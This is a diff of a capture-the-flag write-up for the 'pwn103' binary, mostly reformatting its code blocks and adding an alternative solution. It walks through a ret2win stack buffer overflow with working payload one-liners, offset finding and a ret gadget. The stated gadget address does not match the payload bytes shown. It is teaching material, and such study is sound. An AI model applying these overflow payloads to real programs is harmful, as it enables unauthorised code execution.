@@ -3,8 +3,8 @@
 ## exploit
 
 ```bash
-	$ python3 -c "open('payload','wb').write(b'A'*32 + b'B'*8 + b'\xec\x16\x40\x00\x00\x00\x00\x00' + b'\x54\x15\x40\x00\x00\x00\x00\x00')"
- 	$ (echo "3\n"; cat payload; cat) | ./pwn103.pwn103
+python3 -c "open('payload','wb').write(b'A'*32 + b'B'*8 + b'\xec\x16\x40\x00\x00\x00\x00\x00' + b'\x54\x15\x40\x00\x00\x00\x00\x00')"
+(echo "3\n"; cat payload; cat) | ./pwn103.pwn103
 ```
 
 ## Why ?
@@ -27,7 +27,7 @@ now, let's exploit !
 we're going to find the size of the buffer by using `msf-pattern` and `gdb-peda`:
 
 ```bash
-	msf-pattern_create -l 100
+msf-pattern_create -l 100
 ```
 
 then run gdb peda:
@@ -36,12 +36,12 @@ then run gdb peda:
 the use msf-patter_offset:
 
 ```bash
-	msf-pattern_offset -q 0x4132624131624130
+msf-pattern_offset -q 0x4132624131624130
 ```
 
 ### find interesting functions
 
-and we find that the buffer has a size of 32 or 0x20 bits now, we have to find how to exploit let's open cutter to find some intersting funtions or others:
+and we find that the buffer has a size of 32 or 0x20 bytes now, we have to find how to exploit let's open cutter to find some intersting funtions or others:
 
 ![](img/cutter.png)
 
@@ -55,13 +55,13 @@ now we have all to exploit:
 
 ### let's build the exploit !
 
-payload = buffer_size + 8bits to write into the RSP registre + admins_only adress
+payload = buffer_size + 8bytes to write into the RSP registre + admins_only adress
 
 let's try it !
 
 ```bash
-	python3 -c "open('payload','wb').write(b'A'*32 + b'B'*8 + b'\x54\x15\x40\x00\x00\x00\x00\x00')"
-	(echo "3\n"; cat payload; cat) | ./pwn103.pwn103 
+python3 -c "open('payload','wb').write(b'A'*32 + b'B'*8 + b'\x54\x15\x40\x00\x00\x00\x00\x00')"
+(echo "3\n"; cat payload; cat) | ./pwn103.pwn103 
 ```
 
 saddly, it's didn't work...
@@ -81,7 +81,7 @@ so, let's find a ret intruction and add it into our payload
 
 let's use `ROPgadget` to find a ret instruction:
 ```bash
-	ROPgadget --binary pwn103.pwn103 | grep ret
+ROPgadget --binary pwn103.pwn103 | grep ret
 ```
 ![](img/ROPgadget.png)
 
@@ -92,10 +92,19 @@ so let's add `0x0000000000401016` to the payload
 new payload = buffer_size + 8bits to write into the RSP registre + ret_adress + admins_only adress
 
 ```bash
-	$ python3 -c "open('payload','wb').write(b'A'*32 + b'B'*8 + b'\xec\x16\x40\x00\x00\x00\x00\x00' + b'\x54\x15\x40\x00\x00\x00\x00\x00')"
- 	$ (echo "3\n"; cat payload; cat) | ./pwn103.pwn103
+python3 -c "open('payload','wb').write(b'A'*32 + b'B'*8 + b'\xec\x16\x40\x00\x00\x00\x00\x00' + b'\x54\x15\x40\x00\x00\x00\x00\x00')"
+(echo "3\n"; cat payload; cat) | ./pwn103.pwn103
 ```
 
 ![](img/exploit.png)
 
 GG !
+
+## PS:
+
+After viewing a stream of [topklean](https://twitch.tv/topklean) i see another solution without bypass the MOVAPS issue:
+
+```bash
+python3 -c "open('payload','wb').write(b'A'*32 + b'B'*8 + b'\x7a\x15\x40\x00\x00\x00\x00\x00')"
+(echo "3\n"; cat payload; cat) | ./pwn103.pwn103
+```
